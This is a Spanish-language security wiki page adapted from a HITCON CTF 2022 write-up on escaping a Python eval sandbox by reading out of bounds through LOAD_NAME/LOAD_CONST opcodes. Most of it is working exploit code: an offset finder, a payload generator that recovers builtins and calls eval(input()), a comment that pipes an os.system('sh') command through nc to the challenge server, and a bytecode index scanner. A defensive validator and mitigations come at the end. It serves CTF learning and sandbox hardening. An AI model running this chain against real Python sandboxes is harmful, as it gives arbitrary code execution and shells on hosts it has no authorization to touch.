# LOAD_NAME / LOAD_CONST opcode OOB Read

Esta página adapta el writeup original de Splitline sobre "V O I D" de HITCON CTF 2022 y su exploit chain.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Un operando `LOAD_NAME` o `LOAD_CONST` puede leer fuera de una tupla `co_names` o `co_consts` acortada deliberadamente. En este desafío, se utilizan nombres dummy inalcanzables hasta que una entrada cercana contiene un atributo útil como `__getattribute__`.<sup>[[1]](#references)</sup>

El payload restante reutiliza ese nombre recuperado para construir un sandbox escape.<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

El wrapper del desafío es corto y compila una expresión antes de evaluarla:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
La entrada se compila en un objeto de código de Python; después, el wrapper reemplaza sus `co_consts` y `co_names` por tuplas vacías antes de llamar a `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Cualquier instrucción generada que aún indexe una de esas tablas puede hacer que el intérprete se bloquee o exponer un puntero a un objeto adyacente, dependiendo del build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

¿Cómo ocurre el segfault?

Para una expresión de lista como `[a, b, c]`, el compilador emite instrucciones `LOAD_NAME` con operandos consecutivos:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Si `co_names` se reemplaza por `()`, el bytecode todavía contiene `LOAD_NAME 2`; por lo tanto, un acceso a la tupla sin comprobación puede obtener un puntero fuera de la tupla en lugar de generar `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` y `LOAD_CONST` son las primitivas principales aquí: sus operandos enteros seleccionan entradas en `co_names` y `co_consts`, respectivamente.<sup>[[1]](#references)[[2]](#references)</sup>

En el dispatch de CPython, `LOAD_CONST` recupera la entrada seleccionada de la tupla y la coloca en la pila; las compilaciones de release utilizan un accessor de tupla sin comprobación:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Sondea operandos `LOAD_NAME` crecientes en el intérprete objetivo para mapear entradas útiles. Splitline observó offsets útiles superiores a 700 en el entorno del desafío, pero la disposición depende de la compilación; un debugger puede ayudar a inspeccionar la memoria circundante.<sup>[[1]](#references)</sup>

### Generación del Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una vez que un offset produce un nombre útil, coloca la búsqueda fuera de rango en una expresión inalcanzable y referencia el mismo slot de `co_names` desde un acceso a atributo alcanzable.<sup>[[1]](#references)</sup>

Por ejemplo, si el offset 5 produce `__getattribute__`, mantén ese nombre en el slot 5 mientras la rama falsa realiza la búsqueda útil:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> El texto recuperado no tiene por qué ser `__getattribute__`; cualquier identificador que sirva para el payload puede ocupar el espacio.<sup>[[1]](#references)</sup>

El compilador reutiliza un espacio de `co_names` para las apariciones repetidas de un mismo nombre, como ilustra el desensamblado:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Dado que `LOAD_ATTR` también resuelve su nombre mediante `co_names`, la rama alcanzable puede reutilizar esa posición; los operandos empaquetados en versiones más recientes de CPython se describen en las notas de versión a continuación.<sup>[[1]](#references)[[2]](#references)</sup>

Se pueden sintetizar enteros pequeños no negativos a partir de expresiones booleanas sin constantes:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

El exploit original usaba nombres en lugar de constantes para mantenerse dentro del límite de longitud del reto.<sup>[[1]](#references)</sup>

Esta función auxiliar analiza posibles offsets de nombres mediante la construcción de un objeto de código con una tupla `co_names` vacía.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
El generador siguiente asigna los offsets recuperados a nombres y emite el payload a nivel de código fuente.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
En términos generales, el payload generado obtiene los globales de una función, recupera `builtins` y llama a `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notas de versión y opcodes afectados (Python 3.11–3.13)

- En CPython 3.11–3.13, las instrucciones siguen usando operandos enteros para indexar las tablas de constantes y nombres del objeto de código. Si alguna de las tuplas es más corta que un índice referenciado, un acceso sin comprobación puede leer un puntero de objeto adyacente y provocar un crash o operar sobre él; el comportamiento exacto depende de la compilación del intérprete.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` y (3.12+) `RETURN_CONST consti` leen `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Los usuarios directos de la tabla de nombres incluyen `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` y (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` y `LOAD_ATTR namei` usan `co_names[namei >> 1]`; el bit inferior controla el comportamiento documentado de NULL/method. (3.12+) `LOAD_SUPER_ATTR namei` usa `co_names[namei >> 2]` y empaqueta dos flags en sus bits inferiores.<sup>[[2]](#references)</sup>
- Python 3.11+ introdujo adaptive/inline caches que añaden entradas `CACHE` ocultas entre las instrucciones. El bytecode creado manualmente debe tener en cuenta esas entradas al construir `co_code`.<sup>[[2]](#references)</sup>

Implicación práctica: el diseño del bytecode y los offsets recuperados dependen de la versión y la compilación. Prueba la técnica y cualquier payload generado contra la versión de CPython objetivo antes de depender de ella.<sup>[[2]](#references)</sup>

### Escáner rápido de índices OOB útiles (compatible con 3.11+/3.12+)

Si prefieres buscar objetos interesantes directamente desde el bytecode en lugar de hacerlo desde código fuente de alto nivel, puedes generar objetos de código mínimos y probar índices mediante fuerza bruta. El helper siguiente inserta inline caches según los metadatos `dis` del intérprete objetivo.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Para sondear nombres en su lugar, cambia `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` y ajusta el uso de la pila y el operando empaquetado para el opcode objetivo.<sup>[[2]](#references)</sup>
- Usa `EXTENDED_ARG` o varios bytes de `arg` para alcanzar índices >255 si es necesario. Este helper solo emite el byte bajo del operando, por lo que los índices mayores requieren construir bytes sin procesar o realizar múltiples cargas.<sup>[[2]](#references)</sup>

### Patrón mínimo de RCE solo con bytecode (co_consts OOB → builtins → eval/input)

Una vez que identificas un índice de `co_consts` que resuelve al módulo builtins, puedes reconstruir `eval(input())` sin `co_names` manipulando la pila. El material oficial del CTF B01lers 2024 `awpcode` documenta este mismo patrón de OOB-read.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Este enfoque basado únicamente en la pila es útil cuando un reto te proporciona control directo sobre `co_code` y obliga a usar `co_consts=()` y `co_names=()`; evita los trucos a nivel de código fuente y puede mantener los payloads pequeños mediante operaciones de pila de bytecode y constructores de tuplas.<sup>[[4]](#references)</sup>

### Comprobaciones defensivas y mitigaciones para sandboxes

Si estás escribiendo un sandbox de Python que compila o evalúa código no confiable, no dependas de que CPython compruebe los límites de los índices de tupla utilizados por el bytecode. Valida los objetos de código antes de ejecutarlos.<sup>[[2]](#references)[[3]](#references)</sup>

Validador práctico (rechaza el acceso OOB a co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ideas adicionales de mitigación
- No permitas `CodeType.replace(...)` arbitrario sobre entradas no confiables, o añade comprobaciones estructurales estrictas sobre el objeto de código resultante.
- Considera ejecutar el código no confiable en un proceso separado con sandboxing a nivel del sistema operativo (seccomp, job objects, containers) en lugar de depender de la semántica de CPython.

## References

- [1] [Writeup de Splitline sobre HITCON CTF 2022, "V O I D" (origen de esta técnica y cadena de exploit de alto nivel)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentación de `dis` de Python 3.13 (índices de bytecode, operandos de nombres empaquetados y cachés inline)](https://docs.python.org/3.13/library/dis.html)
- [3] [Macros de acceso a tuplas de CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Writeup del challenge `awpcode` de B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [C API de Python: objetos de código](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
